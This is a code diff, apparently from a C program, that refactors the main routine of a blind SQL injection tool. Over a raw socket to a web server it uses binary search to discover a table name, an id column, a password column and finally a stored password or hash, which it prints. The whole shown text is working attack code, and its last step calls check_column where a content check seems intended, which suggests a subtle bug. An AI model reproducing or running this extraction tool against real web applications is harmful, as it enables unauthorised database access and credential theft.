@@ -447,38 +447,66 @@ int32_t main() {
 
     int32_t sockfd = create_socket();
     _connect(sockfd, WEB_ADDR, 80);
-    char table_name[31] = {0};
-    GeneralCtx table_ctx = {
-        .sockfd = sockfd,
-        .discovered = table_name,
-        int index;
-        char *guess;
-    };
 
-    binary_search(table_name, check_table, );
+
+    char table_name[31] = {0};
+    {
+        GeneralCtx table_ctx = {
+            .sockfd = sockfd,
+            .discovered = table_name
+        };
+
+        binary_search(check_table, &table_ctx);
+    }
 
     #ifdef __MY_DEBUG__
         printf("Found Table: %s\n", table_name);
     #endif
 
     // 2. Find ID Column
-    char id_name[33] = {0};
-    ColumnCtx id_ctx = { .table_name = table_name, .col_hint = "id" };
-    binary_search(id_name, sockfd, &id_ctx, check_column);
+    char id_name[31] = {0};
+    {
+        ColumnCtx id_ctx = {
+            .gen_ctx = {
+                .sockfd = sockfd,
+                .discovered = id_name
+            },
+            .table_name = table_name,
+            .col_to_find = "id"
+        };
+
+        binary_search(check_column, &id_ctx);
+    }
 
     // 3. Find Password Column
-    char pwd_name[33] = {0};
-    ColumnCtx pwd_ctx = { .table_name = table_name, .col_hint = "pwd" };
-    binary_search(pwd_name, sockfd, &pwd_ctx, check_column);
+    char pwd_name[31] = {0};
+    {
+        ColumnCtx pwd_ctx = {
+            .gen_ctx = {
+                .sockfd = sockfd,
+                .discovered = pwd_name
+            },
+            .table_name = table_name,
+            .col_to_find = "pwd"
+        };
+
+        binary_search(check_column, &pwd_ctx);
+    }
 
     // 4. Find Actual Password Data
-    char final_password[33] = {0};
-    DataCtx data_ctx = {
-        .table_name = table_name,
-        .id_col = id_name,
-        .pwd_col = pwd_name
-    };
-    binary_search(final_password, sockfd, &data_ctx, check_content);
+    char final_password[31] = {0};
+    {
+        PwdCtx data_ctx = {
+            .gen_ctx = {
+                .sockfd = sockfd,
+                .discovered = final_password
+            },
+            .table_name = table_name,
+            .id_col = id_name,
+            .pwd_col = pwd_name
+        };
+        binary_search(check_column, &data_ctx);
+    }
 
     printf("Found Password/Hash: %s\n", final_password);
 
